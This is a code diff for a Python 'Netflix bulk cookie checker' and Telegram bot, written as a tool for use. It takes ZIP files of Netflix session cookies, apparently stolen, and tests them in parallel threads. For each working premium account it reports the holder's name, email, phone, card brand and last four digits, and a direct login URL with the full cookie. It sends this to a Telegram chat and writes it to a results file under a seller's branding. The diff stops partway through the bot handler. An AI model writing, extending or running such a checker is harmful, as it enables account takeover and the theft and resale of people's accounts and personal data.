@@ -291,4 +291,172 @@ class NetflixBulkChecker:
                     f.write(cookie_text)
                 
                 self.send_hit_to_telegram(result, len(self.premium_accounts))
-                print(f"{Fore.GREEN}[✓] HIT #{len(self.premium_accounts)}: {result.get('email', 'Unknown')} - {result.get('plan', '
+                print(f"{Fore.GREEN}[✓] HIT #{len(self.premium_accounts)}: {result.get('email', 'Unknown')} - {result.get('plan', 'Unknown')}{Style.RESET_ALL}")
+            else:
+                self.stats['bad'] += 1
+    
+    def send_hit_to_telegram(self, result, hit_number):
+        country_flag = self.get_country_flag(result.get('country_code', 'XX'))
+        full_cookie = result.get('cookie', 'N/A')
+        
+        message = f"""
+🔹 <b>PREMIUM ACCOUNT #{hit_number}</b>
+
+📁 <b>Source:</b> <code>{result.get('source', 'Unknown')}</code>
+👤 <b>Name:</b> {result.get('name', 'Unknown')}
+🌍 <b>Country:</b> {result.get('country', 'Unknown')} {country_flag}
+📋 <b>Plan:</b> {result.get('plan', 'Unknown')}
+💰 <b>Price:</b> {result.get('price', 'N/A')}
+📅 <b>Member Since:</b> {result.get('member_since', 'N/A')}
+📅 <b>Next Billing Date:</b> {result.get('next_billing', 'N/A')}
+💳 <b>Payment Method:</b> {result.get('payment_method', 'CC')}
+🏦 <b>Card Brand:</b> {result.get('card_brand', 'N/A')}
+🔢 <b>Last 4 Digits:</b> {result.get('card_last4', 'N/A')}
+📞 <b>Phone:</b> {result.get('phone', 'N/A')}
+✅ <b>Phone Verified:</b> {'Yes' if result.get('phone_verified') else 'No'}
+🎥 <b>Video Quality:</b> {result.get('video_quality', 'HD')}
+📺 <b>Max Streams:</b> {result.get('max_streams', '1')}
+👥 <b>Connected Profiles:</b> {result.get('profile_count', 0)}
+📧 <b>Email:</b> <code>{result.get('email', 'Unknown')}</code>
+🔓 <b>Extra Member Slot:</b> {result.get('extra_member', 'Unknown')}
+
+🔗 <b>Direct Login URL:</b>
+{result.get('login_url', 'N/A')}
+
+🍪 <b>Cookie:</b>
+<code>{full_cookie}</code>
+
+<i>by @Baron_Saplar // @baroshoping</i>
+"""
+        self.send_telegram(message)
+    
+    def display_stats(self):
+        while self.stats['checked'] < self.stats['total']:
+            elapsed = time.time() - self.stats['start_time']
+            cpm = int((self.stats['checked'] / elapsed) * 60) if elapsed > 0 else 0
+            os.system('clear' if os.name == 'posix' else 'cls')
+            print(f"{Fore.YELLOW}NETFLIX BULK COOKIE CHECKER{Style.RESET_ALL}")
+            print(f"\n{Fore.WHITE}Progress: {self.stats['checked']}/{self.stats['total']} | CPM: {cpm}")
+            print(f"{Fore.GREEN}Premium Hits: {self.stats['premium_hits']}")
+            print(f"{Fore.RED}Bad: {self.stats['bad']}")
+            print(f"{Fore.MAGENTA}Errors: {self.stats['errors']}")
+            if self.premium_accounts:
+                print(f"\n{Fore.CYAN}Recent Hits:{Style.RESET_ALL}")
+                for hit in self.premium_accounts[-3:]:
+                    print(f"  {Fore.GREEN}{hit['email']} - {hit['plan']} - {hit['country']}{Style.RESET_ALL}")
+            time.sleep(2)
+    
+    def start(self, cookies_folder):
+        cookie_files = []
+        for root, dirs, files in os.walk(cookies_folder):
+            for filename in files:
+                filepath = os.path.join(root, filename)
+                cookie_files.append(filepath)
+        
+        if not cookie_files:
+            print(f"{Fore.RED}No cookie files found!{Style.RESET_ALL}")
+            return
+        
+        self.stats['total'] = len(cookie_files)
+        print(f"{Fore.YELLOW}Starting Netflix Bulk Checker{Style.RESET_ALL}")
+        print(f"Total Cookies: {len(cookie_files)}")
+        print(f"Threads: {self.threads}")
+        print(f"Telegram: Enabled ✓")
+        
+        display_thread = threading.Thread(target=self.display_stats, daemon=True)
+        display_thread.start()
+        
+        with ThreadPoolExecutor(max_workers=self.threads) as executor:
+            futures = []
+            for i, cookie_file in enumerate(cookie_files, 1):
+                future = executor.submit(self.process_cookie_file, cookie_file, i)
+                futures.append(future)
+            
+            for future in as_completed(futures):
+                try:
+                    future.result(timeout=30)
+                except:
+                    with self.lock:
+                        self.stats['errors'] += 1
+        
+        self.print_final_summary()
+    
+    def print_final_summary(self):
+        elapsed = time.time() - self.stats['start_time']
+        print(f"\n{Fore.CYAN}{'='*70}")
+        print(f"{Fore.YELLOW}CHECKING COMPLETE{Style.RESET_ALL}")
+        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}")
+        print(f"Total Checked: {self.stats['checked']}")
+        print(f"{Fore.GREEN}Premium Hits: {self.stats['premium_hits']}{Style.RESET_ALL}")
+        print(f"{Fore.RED}Bad: {self.stats['bad']}{Style.RESET_ALL}")
+        print(f"{Fore.MAGENTA}Errors: {self.stats['errors']}{Style.RESET_ALL}")
+        print(f"Time: {int(elapsed)} seconds")
+        print(f"{Fore.CYAN}{'='*70}{Style.RESET_ALL}\n")
+        
+        if self.premium_accounts:
+            self.save_premium_summary()
+    
+    def save_premium_summary(self):
+        os.makedirs('results', exist_ok=True)
+        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
+        with open(f'results/premium_accounts_{timestamp}.txt', 'w', encoding='utf-8') as f:
+            f.write("="*80 + "\n")
+            f.write(f"💎 PREMIUM ACCOUNTS DETAILS (Only Premium):\n")
+            f.write("="*80 + "\n\n")
+            for i, acc in enumerate(self.premium_accounts, 1):
+                country_flag = self.get_country_flag(acc.get('country_code', 'XX'))
+                f.write(f"🔹 PREMIUM ACCOUNT #{i}\n")
+                f.write(f"📁 Source: {acc.get('source', 'Unknown')}\n")
+                f.write(f"👤 Name: {acc.get('name', 'Unknown')}\n")
+                f.write(f"🌍 Country: {acc.get('country', 'Unknown')} {country_flag}\n")
+                f.write(f"📋 Plan: {acc.get('plan', 'Unknown')}\n")
+                f.write(f"💰 Price: {acc.get('price', 'N/A')}\n")
+                f.write(f"📅 Member Since: {acc.get('member_since', 'N/A')}\n")
+                f.write(f"📅 Next Billing Date: {acc.get('next_billing', 'N/A')}\n")
+                f.write(f"💳 Payment Method: {acc.get('payment_method', 'CC')}\n")
+                f.write(f"🏦 Card Brand: {acc.get('card_brand', 'N/A')}\n")
+                f.write(f"🔢 Last 4 Digits: {acc.get('card_last4', 'N/A')}\n")
+                f.write(f"📞 Phone: {acc.get('phone', 'N/A')}\n")
+                f.write(f"✅ Phone Verified: {'Yes' if acc.get('phone_verified') else 'No'}\n")
+                f.write(f"🎥 Video Quality: {acc.get('video_quality', 'HD')}\n")
+                f.write(f"📺 Max Streams: {acc.get('max_streams', '1')}\n")
+                f.write(f"👥 Connected Profiles: {acc.get('profile_count', 0)}\n")
+                f.write(f"📧 Email: {acc.get('email', 'Unknown')}\n")
+                f.write(f"🔓 Extra Member Slot: {acc.get('extra_member', 'Unknown')}\n")
+                f.write(f"🔗 Direct Login URL: {acc.get('login_url', 'N/A')}\n")
+                f.write(f"🍪 Cookie: {acc.get('cookie', '')}\n")
+                f.write("-"*80 + "\n\n")
+        print(f"{Fore.GREEN}Premium summary saved to results/ folder{Style.RESET_ALL}")
+
+@bot.message_handler(commands=['start'])
+def start(message):
+    bot.reply_to(message, "👋 Send me a **ZIP file** containing your Netflix cookie .txt files.\nOne account per .txt file.\nI will check them all instantly!")
+
+@bot.message_handler(content_types=['document'])
+def handle_document(message):
+    if not message.document.file_name.lower().endswith('.zip'):
+        bot.reply_to(message, "❌ Please send a **.zip** file containing your .txt cookie files.")
+        return
+
+    bot.reply_to(message, "✅ ZIP received. Extracting and starting check...")
+
+    try:
+        file_info = bot.get_file(message.document.file_id)
+        downloaded_file = bot.download_file(file_info.file_path)
+
+        with tempfile.TemporaryDirectory() as temp_dir:
+            zip_path = os.path.join(temp_dir, "cookies.zip")
+            with open(zip_path, 'wb') as f:
+                f.write(downloaded_file)
+
+            extract_dir = os.path.join(temp_dir, "cookies")
+            os.makedirs(extract_dir, exist_ok=True)
+            with zipfile.ZipFile(zip_path, 'r') as zip_ref:
+                zip_ref.extractall(extract_dir)
+
+            checker = NetflixBulkChecker(
+                telegram_token=BOT_TOKEN,
+                telegram_chat_id=str(message.chat.id),
+                threads=10
+            )
+     
